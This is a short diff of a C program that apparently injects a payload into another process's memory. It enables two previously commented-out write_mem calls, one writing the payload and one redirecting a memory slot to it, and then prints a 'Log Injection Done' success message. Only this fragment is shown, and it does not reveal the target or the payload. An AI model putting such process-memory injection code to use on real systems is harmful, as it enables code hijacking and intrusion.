@@ -292,8 +292,8 @@ int main(int argc, char **argv) {
   printf("Payload size: %zu bytes\n", payload_size);
   if (dump_payload)
     print_payload_hex(payload, payload_size);
-  // write_mem(fd, payload_addr, payload, payload_size);
-  // write_mem(fd, slot_addr, &payload_addr, 8);
+  write_mem(fd, payload_addr, payload, payload_size);
+  write_mem(fd, slot_addr, &payload_addr, 8);
   free(payload);
   close(fd);
   printf("[SUCCESS] Simple Log Injection Done.\n");
